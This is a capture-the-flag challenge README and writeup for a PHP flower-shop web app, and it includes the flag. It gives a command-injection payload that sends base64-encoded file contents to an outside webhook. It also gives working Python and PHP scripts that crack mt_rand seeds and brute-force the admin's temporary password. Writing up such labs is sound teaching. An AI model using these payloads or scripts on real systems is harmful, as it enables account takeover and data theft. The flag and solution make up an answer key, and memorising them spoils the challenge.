# FlowerShop
For help setting the challenge up, go to `INSTALL.md`

### Include files:
- FlowerShop.zip

### Description
Flowers! 

Flag format: CACI{}

### Difficulty
unintended: 5/10

intended: 10/10

### Flag
`CACI{y0uv3_f0und_th3_rar3st_s33d_0f_all!}`

### Hints
1. seeds are very important in the flower business

### Author
CACI SPONSORED CHALLENGE
Daniel Getter (NihilistPenguin)

### Tester
None yet

### Writeup
#### UNINTENDED SOLVE:
This challenge was initially designed to be run in a container per team, but due to infrastructure limitations, we had a shared instance of the web app. Luckily for us, I suck at PHP dev and wrote in a command injection that I never fixed. Without this vuln, this challenge would be impossible to solve using the intended method.

classes/reset.class.php has command injection on `$this->wh`, as it's user-controlled non-filtered input:
```php
exec("php ../scripts/send_pass.php " . $this->tmpPass . " " . $this->wh . " > /dev/null 2>&1 &");
```

When signing up a user, add a parameter with bash command injection to your webhook URL, and submit a reset request. 
```
https://webhook.site/ceec0a12-ebd4-4dbc-b91d-66d03d3f397e?a=`grep${IFS}CACI${IFS}../admin.php${IFS}|${IFS}base64
```

You should get a request with the base64'd result in the param:
```
https://webhook.site/60de2023-dc15-40bf-a6eb-c0c458d282a4?a=ICAgICAgICA8aDM+Q0FDSXt5MHV2M19mMHVuZF90aDNfcmFyM3N0X3MzM2RfMGZfYWxsIX08L2gz
```
```bash
$ echo ICAgICAgICA8aDM+Q0FDSXt5MHV2M19mMHVuZF90aDNfcmFyM3N0X3MzM2RfMGZfYWxsIX08L2gz | base64 -d    
<h3>CACI{y0uv3_f0und_th3_rar3st_s33d_0f_all!}</h3
```
You can do anything with this command injection, like a full-blown reverse shell if you want.

---
#### FUNNIEST UNINTENDED SOLVE
The admin webhook url in the database is `https://webhook.site/fake`. If you pay $16 for a premium webhook account, you can specify a URL of your choosing, so you can technically just buy `https://webhook.site/fake` and then submit an admin password request and you'll get the flag. 

---

#### INTENDED SOLVE
If the vuln above is patched, I _believe_ this is the only possible solution. It does have the prerequisite that each team has their own instance so other people don't reset the admin password while you attempt to crack it.


This challenge abuses the fact that the code uses `mt_rand` and other low-entropy psuedo-randomization functions to create temporary passwords. We can see this in the `helpers.php` file:
```php
function genRandString($length) {
  $allowable_characters = 'abcdefghijklmnopqrstuvwxyz';
  $len = strlen($allowable_characters) - 1;
  $str = '';

  for ($i = 0; $i < $length; $i++) {
    $str .= $allowable_characters[mt_rand(0, $len)];
  }

  return $str;
}

function genTmpPwd() {
  list($usec, $sec) = explode(' ', microtime());
  $usec *= 1000000;
  $tmpPass = genRandString(8) . $sec . $usec . posix_getpid(); 

  return $tmpPass;
}
```

The `genRandString()` function only uses lowercase letters. This is prepended to the time in seconds and microseconds that the reset request was made and the PID of the process handling the requst. 2 of these 4 "random" pieces of the password have essentially 0 entropy. 

`$sec` if just the epoch time in the moment of the request. One way to know exactly what time it is, is to just look at the HTTP response header and convert the Date (ex: `Date: Fri, 14 Jul 2023 00:59:49 GMT`) into epoch time. The second way is easier, and we will talk about that when we discuss `$usec`.

`posix_getpid()` will return the PID of the process handling the request. You may think that there are millions of possible PID values, but the entropy is actually 0. First, you might be relieved when running `ps aux` in your docker container that there are less than 10 process running (probably) and their PIDs seem to be all under 59. You may also notice that the apache processes seem to always be 17 to ~22. Looking good, but we can do better. If you run `apachectl -M` in the container, you should see this line: `php5_module (shared)`. This means that `mod_php` is enabled on the server. You can read about it, but the only part we care about is that requests in the same session will be handled within the same process. So if we make a request and get its PID and then make a second request in the same session, its PID will be the exact same. Luckily for us, the temporary password generated is not hashed and just gives us the PID in plaintext. If we make a password reset request for our own account and then for the admin (in the same session), we can see the PID in our temprorary password and be confident that the PID used in the admin reset password is the same.

The above method is also the way we can grab the server's `$sec` epoch time instead of converting the `Date` header. Okay, 2 of the 4 parts have been reduced to an entropy of 0. Let's see if we can do anything about `$usec` now.

`$usec` is the microsecond time of when the request is handled. Brute forcing 1000000 values is a bit too much. The easiest way to narrow this entropy down is just to hope that your latency with the server is less than a second. If we send the reset request at microtime 0 and the server handles it at microtime 30000, effectively cutting the entropy down 30x. To figure out this range, we can just send several reset requests to our own user and get the time between us sending the request and the microtime we see in our reset password. The problem with this is that it relies on being sync'd up exactly with the server's time, which is not the case, as there is generally some microsecond deviation. A better way (even though there is more entropy), is to just time the difference between two sequential password reset generations. So, instead of quantifying the avg time between request sent and password generation, we are quantifying the avg time between password generation #1 and password generation #2. All you have to do is send 2 sequential reset requests to your created user and pull out the microsecond time in the reset password sent to you. Do this enough times and you should have found a good range of time after the first password generation that the second password gets generated. In my testing, I've found the 2nd password gets generated around 90,000 - 150,000 microseconds after the first. The larger this range, the higher the entropy and search space needed for brute-forcing. These requests are called "request twins"

[This paper](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final218.pdf) has a good explanation of 2 methods to reduce time-based entoropy: adversarial time synchronization and request twins. Both of these methods could be used here too. It's also worth a read as it relates to PHP seed attacks.

We are now left with the `genRandString(8)` part of the password. Without digging in, there are 26^8 (208 billion) possible combinations here, yikes. Luckliy for us, it is using `mt_rand`, which is a psuedorandom number generator (PRNG) and not a true random number generator (especially in older verions of PHP before they tried adding some better randomization, which is still not great and should be avoided). [php_mt_seed](https://github.com/openwall/php_mt_seed) is a seed cracker for `mt_rand()`. The README for the tools is really good at explaining how it works and how to use it in different scenarios. [Insufficient Entropy For Random Values
](https://github.com/padraic/phpsecurity/blob/master/book/lang/en/source/Insufficient-Entropy-For-Random-Values.rst) is also very good and helpful read. 

Assuming you read the links and understand what is happening, we can move on. The `createCsrf()` function seen below is the key to solving this challenge.
```php
function createCsrf() {
  mt_srand();
  return md5(genRandString(8));
}
```
The first thing it does is call `mt_srand()` which will re-seed the PRNG that `mt_rand` uses. This function is called only in `login.php`, so whenever that page is rendered `mt_rand` will be re-seeded. I'll leave understanding why this is important as an exercise to the reader. If we can crack the CSRF hash and retrive the 8 "randomly" generated characters, we can use `php_mt_seed` to crack the seed initialized with `mt_srand`. Once we have the seed, we can then regenerate the results of the `genRandString` calls to get the string used in the admin password reset.

We now have a plan for attack:
1. send request twins to quantify microsecond time difference between two sequential reset request password generations
2. send a password reset for your account and admin
3. crack the MD5 hash of the CSRF
4. php_mt_seed to get mt_srand() used for CSRF
5. regenerate mt_rand() outputs to get the string used for the admin temporary password 
6. brute force login attempts guessing microtime within a calculated range

---

Let's start our attack script:
```python
import time
import requests
from bs4 import BeautifulSoup

def get_csrf(s):
    """
    Parse the login.php page for the CSRF token
    """
    r = s.get('http://127.0.0.1/login.php')
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'token'})
    csrf_token = csrf_input['value']

    return csrf_token


def reset_pass(username, session, csrf):
    """
    Send a password reset request
    """
    data = {
        'uid': username,
        'token': csrf,
        'submit': ''
    }

    # don't follow redirect or else you'll land back on login.php and
    # force CSRF generation, causing mt_srand to re-seed and thus the passwords
    # will be generated using a differnt seed than the one we will crack
    response = session.post('http://127.0.0.1/modules/reset.inc.php', data=data, allow_redirects=False) 
    return csrf

# start a session to keep these requests under one PID
session = requests.session()
# get seconds and microseconds of the time that we send the request
sec = int(time.time())
microsec = int(time.time_ns() / 1_000) % 1_000_000
# grab the CSRF token
csrf = get_csrf(session)
# send a password reset request for our user
reset_pass('test', session, csrf)
print(csrf)
print(sec)
print(microsec)

# do the same with the admin reset request
sec = int(time.time())
microsec = int(time.time_ns() / 1_000) % 1_000_000
csrf = reset_pass('admin', session, csrf)
print(sec)
print(microsec)
```
```
OUTPUT:

53d2a5278ce7145d0a8f20a5f086591b
1688929912
122821

1688929912
198843
```

NOTE: when doing the request twins, just swap out the 2nd request reset of the admin account for your test user. Pull out the usec from the generated passwords and see their time difference. For this example, I'm going with the usec range of 90,000 - 150,000.

Now we need to crack the CSRF hash. This is easily done with the following hashcat command: `hashcat -m 0 -a 3 -i --increment-min=8 hash.txt ?l?l?l?l?l?l?l?l -w 3 -O`. Cracked: `ljcayigp`. 

Time to use `php_mt_rand`. I made this php script to automatically generate the proper input for `php_mt_rand` based on the `pw2args.php` script discussed here: https://github.com/openwall/php_mt_seed.

```php
$allowable_characters = 'abcdefghijklmnopqrstuvwxyz';
$len = strlen($allowable_characters) - 1;
$pass = $argv[1];

$iter = 0;
for ($i = 0; $i < $iter; $i++) {
  for ($j = 0; $j < strlen($pass); $j++) {
    echo "0 0 0 0  ";
  } 
}

for ($i = 0; $i < strlen($pass); $i++) {
  $number = strpos($allowable_characters, $pass[$i]);
  echo "$number $number 0 $len  ";
}
echo "\n";
```

Now if we run:
```
./php_mt_seed `php pw2args.php ljcayigp`
```
we should see that it found one: `seed = 0x1407828c = 336036492`


To regenerate `mt_rand` output used for the admin temporary password, we need to copy the `genRandString` function and run it after seeding `mt_srand` with `336036492`. Here is my `regen.php` script:
```php
function genRandString($length) {
  $allowable_characters = 'abcdefghijklmnopqrstuvwxyz';
  $len = strlen($allowable_characters) - 1;
  $str = '';

  for ($i = 0; $i < $length; $i++) {
    $str .= $allowable_characters[mt_rand(0, $len)];
  }

  return $str;
}

mt_srand(336036492);
// csrf token
echo genRandString(8);
echo "\n";
// rand string for "test" reset
echo genRandString(8);
echo "\n";
// rand string for "admin" reset
echo genRandString(8);
echo "\n";
```

IMPORTANT: you have to run this in a php5.6 environment for this to generate properly. You might as well just use the the same docker container that you are running the challenge. You can check the output of each string generation with the CSRF token and the "random" string at the start of the temporary password sent to your test user. 

Let's move on, using `uucoxcyz` as the string starting the admin temporary password. Here is the brute force script:
```python
def brute(stop_flag, success_password, offset, num_threads):
    """
    This will brute force potential passwords. The offset and # of threads
    will determine how each thread counts. 

    Ex: 4 threads means that each thread will increment micro_min by 4 and 
        start on +0, +1, +2, +3 offsets of the micro_min.

        if micro_min is 10, each thread counts as follows:
            thread 1: 0, 4, 8, 12, ...
            thread 2: 1, 5, 9, 13, ...
            thread 3: 2, 6, 10, 14, ...
            thread 4: 3, 7, 11, 15, ...
    """
    sec = 1688929912
    pid = 18
    micro_min = 198843 + 90000 + offset
    micro_max = micro_min + 60000
    start = "uucoxcyz"

    username = 'admin'
    while micro_min < micro_max:
        if stop_flag.is_set():
            return
        pwd = start + str(sec) + str(micro_min) + str(pid)
        print(pwd)
        if login(username, pwd):
            success_password[0] = pwd
            stop_flag.set() 
            return 
        
        micro_min += num_threads


def login(username, pwd):
    
    data = {
        'uid': username,
        'pwd': pwd,
        'submit': ''
    }
    response = requests.post('http://127.0.0.1/modules/login.inc.php', data=data)
    if "Buy seeds" in response.text:
        return True
    

start = time.time()

stop_flag = threading.Event()
success_password = [None]
threads = []
num_threads = multiprocessing.cpu_count() 
for offset in range(num_threads):
    thread = threading.Thread(target=brute, args=(stop_flag, success_password, offset, num_threads))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

if stop_flag.is_set():
    print("Login successful!")
    print("Successful password:", success_password[0])


end = time.time()

print("Time elapsed: " + str(int(end-start)) + " seconds")
```

Make sure you set the `micro_min` and `micro_max` offsets to match the latency differences you are seeing when doing the request twins characterization. This program uses threading to brute force faster. 

If everything goes right (and you're not unlukcy), you will eventually login successfully as admin and can grab the flag from `admin.php`!

Resources and more fun reading:
- https://github.com/padraic/phpsecurity/blob/master/book/lang/en/source/Insufficient-Entropy-For-Random-Values.rst
- https://github.com/openwall/php_mt_seed
- https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final218.pdf
- https://www.ptsecurity.com/upload/corporate/ww-en/download/random_numbers_take_two_eng.pdf
- https://samy.pl/phpwn/BlackHat-USA-2010-Kamkar-How-I-Met-Your-Girlfriend-wp.pdf

